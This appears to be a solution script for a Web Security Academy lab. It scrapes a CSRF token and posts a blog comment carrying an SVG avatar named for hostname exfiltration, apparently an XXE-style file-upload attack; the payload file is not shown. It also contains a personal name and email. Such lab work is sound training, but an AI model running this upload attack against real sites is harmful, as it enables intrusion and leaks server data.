import requests
from bs4 import BeautifulSoup

site = '0ae000d10333146881f8983c00e10088.web-security-academy.net/'
post_id = '2'

s = requests.Session()

# Step 1: Get CSRF token
post_url = f'https://{site}/post?postId={post_id}'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Step 2: Craft and upload the multipart form
comment_url = f'https://{site}/post/comment'
multipart_form_data = {
    'csrf': (None, csrf),
    'postId': (None, post_id),
    'comment': (None, 'Nice blog. Be a shame if anything happened to it.'),
    'name': (None, 'Jarren'),
    'email': (None, 'calizo@pdx.edu'),
    'website': (None, 'https://pdx.edu'),
    'avatar': ('avatar_hostname_exfil.svg', open('avatar_hostname_exfil.svg', 'rb'))
}

resp = s.post(comment_url, files=multipart_form_data)
print("[✓] Comment posted successfully.")
